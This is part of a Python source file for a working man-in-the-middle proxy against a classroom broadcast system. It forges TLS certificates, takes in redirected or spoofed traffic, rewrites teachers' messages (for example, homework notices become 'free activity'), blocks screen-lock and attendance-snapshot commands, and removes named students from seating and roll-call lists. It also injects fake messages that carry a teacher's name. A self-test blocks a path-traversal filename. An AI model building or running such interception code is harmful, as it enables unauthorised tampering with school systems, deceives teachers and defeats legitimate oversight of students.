            for k in ("sender", "senderRole", "senderAvatar", "displayMode", "title",
                      "enableTTS", "source", "className"):
                if k in body:
                    frame[k] = body[k]
            if "sender" in body and "senderRole" not in body:
                frame["senderRole"] = "teacher"   # 客户端按 teacher 渲染名片卡片
    frame = dict(frame)
    if not (frame.get("messageId") or frame.get("message_id")):
        frame["messageId"] = "inj" + str(int(time.time() * 1000))
    return frame, apply_rules

def transform_downlink(text, direction="down"):
    """服务器->客户端 文本帧的统一入口: 所有 type 都过规则引擎。
    (旧版只送 broadcast.message, 导致 block_ws_types 对其它类型永不命中,
     class.data.* 内嵌座位改写不可达)。返回改写后文本; None = 丢弃该帧。
    每个帧都进捕获环 (动作: pass / rewrite / drop)。"""
    try:
        frame = json.loads(text)
    except Exception:
        return text
    if not isinstance(frame, dict):
        return text
    new = transform_broadcast_frame(frame)
    if new is None:
        log("frame DROPPED (type=%s id=%s)" % (frame.get("type"), frame.get("messageId")))
        capture_add(direction, frame, "drop")
        return None
    capture_add(direction, new, "rewrite" if new != frame else "pass")
    return json.dumps(new, ensure_ascii=False)

# WebSocket 双向代理
def capture_uplink(text):
    """记录一条上行业务帧 (只记录, 不改: 上行零篡改不变)。"""
    try:
        frame = json.loads(text)
        if isinstance(frame, dict):
            capture_add("up", frame, "up")
    except Exception:
        pass

async def ws_pump(src, dst, transform=False):
    """单方向泵。transform=True (服务器->客户端) 过规则引擎;
    transform=False (客户端->服务器) 原样透传, 仅记录捕获。"""
    try:
        async for msg in src:
            if msg.type == WSMsgType.TEXT:
                if transform:
                    out = transform_downlink(msg.data)
                    if out is not None:
                        await dst.send_str(out)
                else:
                    capture_uplink(msg.data)
                    await dst.send_str(msg.data)
            elif msg.type == WSMsgType.BINARY:
                await dst.send_bytes(msg.data)
            elif msg.type in (WSMsgType.CLOSE, WSMsgType.CLOSING, WSMsgType.ERROR):
                break
    except Exception as e:
        log("[ws] pump error: %s: %s" % (type(e).__name__, e))
    finally:
        try:
            await dst.close()
        except Exception:
            pass

async def proxy_ws(request):
    upstream = "%s/ws" % ARGS.upstream.replace("http", "ws", 1).rstrip("/")
    client_ws = web.WebSocketResponse()
    await client_ws.prepare(request)
    CLIENTS.add(client_ws)          # 先注册: 上游不可用时注入仍可用
    log("[ws] client connected (%s), clients=%d" % (request.remote, len(CLIENTS)))
    kwargs = {"ssl": AIO_ssl_ctx} if upstream.startswith("wss") else {}
    try:
        async with AIO.ws_connect(upstream, **kwargs) as server_ws:
            log("[ws] upstream: %s" % upstream)
            t1 = asyncio.create_task(ws_pump(client_ws, server_ws, transform=False))
            t2 = asyncio.create_task(ws_pump(server_ws, client_ws, transform=True))
            await asyncio.gather(t1, t2, return_exceptions=True)
    except Exception as e:
        log("[ws] upstream connect failed: %s: %s" % (type(e).__name__, e))
    finally:
        CLIENTS.discard(client_ws)
        try:
            await client_ws.close()
        except Exception:
            pass
    log("[ws] session ended, clients=%d" % len(CLIENTS))
    return client_ws

# HTTP 响应改写调度 (座位表 + 学生名单)
def transform_http_json(path, payload):
    """根据 API 路径分发改写。返回 (payload, changed)。"""
    if RULES.get("passthrough"):
        return payload, False
    # 座位表显示数据 (main.js:10518 /api/v2/seats/display/<classId>)
    if "/seats" in path:
        return transform_seat_data(payload)
    # 学生名单 (main.js:10245 /api/v2/students?classId=) -> 随机点名黑/白名单
    # 注意: rel_url.path 不含 query, 所以按路径结尾判断 (旧版 "/students?" 分支永不命中)
    if path.rstrip("/").endswith("/students"):
        data = payload.get("data")
        if payload.get("success") is True and isinstance(data, list):
            new, ch = apply_student_rules(data)
            if ch:
                payload["data"] = new
                log("STUDENTS rewritten (%s, %d -> %d)" % (path, len(data), len(new)))
            return payload, ch
    return payload, False

# 自检
def selftest():
    # 保留完整结构 (用 deep_merge 而非整体替换, 避免丢 types 等新键)
    def setr(**kw):
        for k, v in kw.items():
            if isinstance(v, dict) and isinstance(RULES.get(k), dict):
                deep_merge(RULES[k], v)
            else:
                RULES[k] = v

    # 1 横幅替换/删除/追加
    setr(banner={"block_banner": False, "replace": [["交作业", "自由活动"]],
                 "remove": ["请家长签字"], "append": " [OK]", "force_sender": "", "force_tts": None})
    out = transform_broadcast_frame({"type": "broadcast.message", "messageType": "text",
        "messageId": "t1", "content": "今晚交作业,请家长签字"})
    assert out["content"] == "今晚自由活动, [OK]", out["content"]
    # 2 禁止横幅
    RULES["banner"]["block_banner"] = True
    assert transform_broadcast_frame({"messageType": "text", "messageId": "t2"}) is None
    RULES["banner"]["block_banner"] = False
    # 3 计时器
    RULES["timer"]["force_seconds"] = 9999
    out = transform_broadcast_frame({"messageType": "text", "messageId": "t3", "content": "x"})
    assert out["popup_duration"] == 9999
    RULES["timer"]["force_seconds"] = 0
    # 4 结对
    setr(seat={"exclude": [], "only": [], "pairs": [["甲", "乙"]]})
    seats = [{"student_name": "甲", "row_number": 1, "col_number": 1},
             {"student_name": "丙", "row_number": 1, "col_number": 2},
             {"student_name": "乙", "row_number": 2, "col_number": 1}]
    transform_seat_data({"data": {"seats": seats}})
    pos = {s["student_name"]: (s["row_number"], s["col_number"]) for s in seats}
    assert pos["乙"] == (1, 2) and pos["丙"] == (2, 1), pos
    # 5 黑名单
    setr(seat={"exclude": ["丁"], "only": [], "pairs": []})
    seats2 = [{"student_name": "丁", "row_number": 1, "col_number": 3}]
    transform_seat_data({"data": {"seats": seats2}})
    assert seats2[0]["seat_type"] == "empty"
    # 6 学生名单黑名单 (真实 path 不含 query) + 相近路径不误伤
    payload = {"success": True, "data": [{"name": "丁"}, {"name": "戊"}]}
    p2, ch = transform_http_json("/api/v2/students", payload)
    assert ch and [s["name"] for s in p2["data"]] == ["戊"], p2
    _p3, _ch3 = transform_http_json("/api/v2/students/export", {"success": True, "data": [{"name": "丁"}]})
    assert not _ch3, "非名单路径不应改写"
    setr(seat={"exclude": [], "only": [], "pairs": []})
    # 7 直通模式
    RULES["passthrough"] = True
    out = transform_broadcast_frame({"messageType": "text", "messageId": "t4", "content": "x"})
    assert out["content"] == "x"
    RULES["passthrough"] = False
    # 8 banner.types 可自定义 (非默认类型也能改)
    setr(banner={"types": ["mybanner"], "replace": [["a", "b"]], "remove": [], "append": "",
                 "force_sender": "", "force_tts": None, "block_banner": False})
    out = transform_broadcast_frame({"messageType": "mybanner", "messageId": "t5", "content": "a"})
    assert out["content"] == "b", out
    # 9 命令拦截
    setr(commands={"block": ["lock_system"], "block_snapshot": True})
    assert transform_broadcast_frame({"messageType": "command", "messageId": "t6",
                                      "command": "lock_system"}) is None
    assert transform_broadcast_frame({"messageType": "command", "messageId": "t7",
                                      "command": "smart-attendance:snapshot"}) is None
    assert transform_broadcast_frame({"messageType": "command", "messageId": "t8",
                                      "command": "lock_app"}) is not None
    # 10 路径穿越拦截
    setr(files={"block_traversal": True, "block": []})
    assert transform_broadcast_frame({"messageType": "file", "messageId": "t9",
                                      "fileName": "..\\..\\evil.txt", "content": "http://x"}) is None
    assert transform_broadcast_frame({"messageType": "file", "messageId": "t10",
                                      "fileName": "safe.pdf", "content": "http://x"}) is not None
    # 11 dry_run: 记录但不改
    setr(banner={"types": ["text"], "replace": [["秘密", "***"]], "remove": [], "append": "",
                 "force_sender": "", "force_tts": None, "block_banner": False})
    setr(debug={"dry_run": True, "log_frames": False, "dump_dir": ""})
    out = transform_broadcast_frame({"messageType": "text", "messageId": "t11", "content": "秘密内容"})
    assert out["content"] == "秘密内容", "dry_run 不应真的改写"
    setr(debug={"dry_run": False, "log_frames": False, "dump_dir": ""})
    # 12 任意 type 的封锁 (旧版只把 broadcast.message 送进规则引擎 -> 该规则永不命中)
    setr(block_ws_types=["renderer.pack.push"])
    assert transform_downlink(json.dumps({"type": "renderer.pack.push", "version": 3})) is None
    assert transform_downlink(json.dumps({"type": "pong"})) is not None
    assert transform_downlink("not-json") == "not-json"
    # 13 尾部 * 前缀匹配
    setr(block_ws_types=["desktop.update.*"])
    assert transform_downlink(json.dumps({"type": "desktop.update.force"})) is None
    setr(block_ws_types=[])
    # 14 class.data.* 帧内嵌座位改写 (旧版不可达)
    setr(seat={"exclude": ["丁"], "only": [], "pairs": []})
    frame = json.loads(transform_downlink(json.dumps({"type": "class.data.updated", "data": {
        "seatLayout": {"seats": [{"student_name": "丁", "row_number": 1, "col_number": 1}]}}})))
    assert frame["data"]["seatLayout"]["seats"][0]["seat_type"] == "empty", frame
    setr(seat={"exclude": [], "only": [], "pairs": []})
    # 15 注入帧组装 (简写横幅 / 命令 / 原始帧 / apply_rules)
    f, opt = build_frame({"text": "注入测试", "sender": "王老师", "seconds": 30})
    assert f["type"] == "broadcast.message" and f["content"] == "注入测试", f
    assert f["messageType"] == "text" and f["senderRole"] == "teacher", f
    assert f["popup_duration"] == 30 and f["popupDuration"] == 30 and f["messageId"], f
    assert opt is False
    f, opt = build_frame({"command": "lock_system"})
    assert f["messageType"] == "command" and f["command"] == "lock_system", f
    f, opt = build_frame({"frame": {"type": "renderer.pack.push", "version": 9}, "apply_rules": True})
    assert f["type"] == "renderer.pack.push" and opt is True, (f, opt)
    assert build_frame({"nothing": 1})[0] is None
    # 16 banner.types 支持尾部 * 前缀匹配
    setr(banner={"types": ["notice*"], "block_banner": False, "replace": [["a", "b"]],
                 "remove": [], "append": "", "force_sender": "", "force_tts": None})
    out = transform_broadcast_frame({"messageType": "notice.popup", "messageId": "t15", "content": "a"})
    assert out["content"] == "b", out
    setr(banner={"types": ["text", "banner", "notice"]})
    # 17 捕获环: 动作标记 (rewrite / pass / drop)
    setr(debug={"dry_run": False, "log_frames": False, "dump_dir": "", "capture_max": 10})
    setr(block_ws_types=[])
    del CAPTURE[:]
    transform_downlink(json.dumps({"type": "broadcast.message", "messageType": "text", "messageId": "c1", "content": "a"}))
    transform_downlink(json.dumps({"type": "pong"}))
    setr(block_ws_types=["renderer.pack.push"])
    transform_downlink(json.dumps({"type": "renderer.pack.push", "version": 1}))
    setr(block_ws_types=[])
    assert [e["action"] for e in CAPTURE] == ["rewrite", "pass", "drop"], CAPTURE
    # 18 捕获环按 capture_max 截断; 0 = 关闭
    setr(debug={"capture_max": 2})
    for _i in range(5):
        transform_downlink(json.dumps({"type": "pong"}))
    assert len(CAPTURE) == 2, len(CAPTURE)
    setr(debug={"capture_max": 0})
    transform_downlink(json.dumps({"type": "pong"}))
    assert len(CAPTURE) == 2, "capture_max=0 应停止记录"
    # 19 dump_dir 单独生效 (旧版被 log_frames 门禁卡死)
    import tempfile
    _d = tempfile.mkdtemp(prefix="xlb_dump_")
    setr(debug={"dry_run": False, "log_frames": False, "dump_dir": _d})
    transform_broadcast_frame({"type": "broadcast.message", "messageType": "text", "messageId": "d1", "content": "z"})
    assert os.listdir(_d), "dump_dir 在 log_frames 关闭时也必须落盘"
    setr(debug={"dry_run": False, "log_frames": False, "dump_dir": "", "capture_max": 200})
    del CAPTURE[:]
    # 20 手动上游 IP 权威短路 (不做污染过滤/证书验证)
    _ip, _src, _cands = resolve_upstream("xlb.810086.com", explicit_ip="203.0.113.9")
    assert _ip == "203.0.113.9" and _src == "manual" and _cands == ["203.0.113.9"], (_ip, _src, _cands)
    print("[selftest] ALL PASS")
    RULES["timer"]["force_seconds"] = 0
    RULES["seat"] = {"exclude": [], "only": [], "pairs": []}

async def main():
    oplog.op("start", oplog.run_arg())
    global AIO, AIO_ssl_ctx, STARTED_AT
    STARTED_AT = time.strftime("%Y-%m-%d %H:%M:%S")
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="0.0.0.0",
                        help="0.0.0.0 = 接收同网段被欺骗过来的流量")
    parser.add_argument("--admin-host", default="127.0.0.1",
                        help="明文端口(规则/注入 API)绑定地址; 默认只本机, 需给同网段客户端用则改 0.0.0.0")
    parser.add_argument("--http-port", type=int, default=8100, help="明文端口(环境变量模式/规则管理)")
    parser.add_argument("--tls-port", type=int, default=443, help="TLS 端口(MITM 模式, 0=不开)")
    parser.add_argument("--upstream", default="https://xlb.810086.com",
                        help="真实上游服务器, 流量改写后原样转发")
    parser.add_argument("--upstream-ip", default="",
                        help="直接指定上游真实 IP (校园网 DNS 被封时用; 等效环境变量 XLB_UPSTREAM_IP)")
    parser.add_argument("--cert-dir", default=os.path.join(ROOT_DIR, "backup"))
    parser.add_argument("--rules", default=os.path.join(ROOT_DIR, "rules", "hijack_rules.json"))
    parser.add_argument("--selftest", action="store_true")
    global ARGS
    ARGS = parser.parse_args()
    ARGS.upstream_host = ARGS.upstream.split("//", 1)[1].rstrip("/")

    if ARGS.selftest:
        selftest(); return

    if os.path.exists(ARGS.rules):
        with open(ARGS.rules, "r", encoding="utf-8") as fh:
            deep_merge(RULES, json.load(fh))   # 深合并: 旧规则文件缺新键时保留默认
        log("rules loaded from %s" % ARGS.rules)
    else:
        with open(ARGS.rules, "w", encoding="utf-8") as fh:
            json.dump(RULES, fh, ensure_ascii=False, indent=2)
        log("default rules template written: %s" % ARGS.rules)

    # 上游连接: 不校验证书 (与客户端 TLS-1 行为对齐)
    # 防 MITM 自环: hosts 已把上游域名指向 127.0.0.1 (指向本代理),
    # 代理连上游时必须绕过 hosts -> 多层解析真实 IP, 固定直连
    global UPSTREAM_IP
    explicit = ARGS.upstream_ip or os.environ.get("XLB_UPSTREAM_IP")
    ip, src, cands = resolve_upstream(ARGS.upstream_host, explicit, ARGS.cert_dir, verbose=True)
    UPSTREAM_IP = ip
    if UPSTREAM_IP:
        log("upstream IP: %s (来源: %s, 候选: %s)" % (UPSTREAM_IP, src, cands))
        if "verified" in src:
            log("          证书验证通过 = 确认是真实服务器 (非 DNS 污染假 IP)")
        elif "unverified" in src:
            log("[!] 无候选通过证书验证 -> 可能是 DNS 污染/证书异常, 继续尝试连接")
        if not tcp_probe(UPSTREAM_IP):
            log("[!] 该 IP 当前探活失败 (网络抖动/出站封锁), 仍将尝试连接")
        write_cached_upstream(ARGS.cert_dir, ARGS.upstream_host, UPSTREAM_IP, src)
    else:
        log("[!] 上游 IP 全部解析失败 (公共 UDP DNS / 系统 DNS / DoH 都不通)")
        log("    -> 校园网常拦截对外 DNS。解决办法: 手动指定真实 IP")
        log("      启动时加参数:  --upstream-ip <真实IP>")
        log("      或设环境变量:  set XLB_UPSTREAM_IP=<真实IP>")
        log("    -> 代理仍会启动 (客户端可连入, 但无法回源); 先跑 py -3 scripts/netcheck.py 诊断")

    up_ctx = ssl.create_default_context()
    up_ctx.check_hostname = False
    up_ctx.verify_mode = ssl.CERT_NONE
    AIO_ssl_ctx = up_ctx
    AIO = ClientSession(
        connector=TCPConnector(ssl=up_ctx, resolver=FixedResolver(cands or ([UPSTREAM_IP] if UPSTREAM_IP else [])),
                               force_close=True),
        timeout=ClientTimeout(total=30))

    app = web.Application(client_max_size=64 * 1024 * 1024)
    app.router.add_route("*", "/ws", proxy_ws)
    app.router.add_route("*", "/{tail:.*}", proxy_http)

    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, ARGS.admin_host, ARGS.http_port).start()
    log("plain http : %s:%d  (规则/注入 API; --admin-host 可改绑定)" % (ARGS.admin_host, ARGS.http_port))

    if ARGS.tls_port > 0:
        cert = os.path.join(ARGS.cert_dir, "hijack_cert.pem")
        key = os.path.join(ARGS.cert_dir, "hijack_key.pem")
        ca_cert = os.path.join(ARGS.cert_dir, "hijack_ca.pem")
        ca_key = os.path.join(ARGS.cert_dir, "hijack_ca_key.pem")
        ensure_cert(cert, key, ARGS.upstream_host, ca_cert, ca_key)
        tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        tls_ctx.load_cert_chain(cert, key)
        await web.TCPSite(runner, ARGS.host, ARGS.tls_port, ssl_context=tls_ctx).start()
        log("TLS mitm   : %s:%d  (伪装 %s, 客户端不验证书 -> 直接过)" % (ARGS.host, ARGS.tls_port, ARGS.upstream_host))

    log("upstream   : %s" % ARGS.upstream)
    log("规则: GET/POST http://127.0.0.1:%d/__rules" % ARGS.http_port)
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
